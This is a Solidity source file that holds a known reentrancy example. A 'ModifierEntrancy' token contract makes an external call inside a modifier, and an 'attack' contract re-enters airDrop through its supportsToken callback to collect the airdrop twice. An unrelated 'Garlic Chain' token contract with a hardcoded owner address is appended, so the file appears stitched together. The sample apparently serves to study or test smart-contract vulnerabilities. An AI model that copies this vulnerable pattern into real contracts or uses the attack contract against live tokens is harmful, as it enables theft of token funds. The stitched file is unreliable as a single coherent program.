 

pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

   
   
  function airDrop() hasNoBalance supportsToken  public{
    tokenBalance[msg.sender] += 20;
  }

   
  modifier supportsToken() {
    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
    _;
  }
   
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack{  
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}

contract BaseToken{    
    string public name;      
    string public symbol;     
    uint8 public decimals;   
    uint256 public totalSupply;     

    mapping (address => uint256) balances;
    address public owner;
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract CustomToken is BaseToken {
    function CustomToken() public {
        totalSupply = 2.6 * 100000000 * 1000000;           
        owner = 0x690Ae62C7b56F08d0d712c6e4Ef1103a5A0B38F9;      
        balances[owner] = totalSupply; 
        name = 'Garlic Chain'; 
        symbol = 'GLC';                    
        decimals = 6; 
        Transfer(address(0), owner, totalSupply);
    }    
}
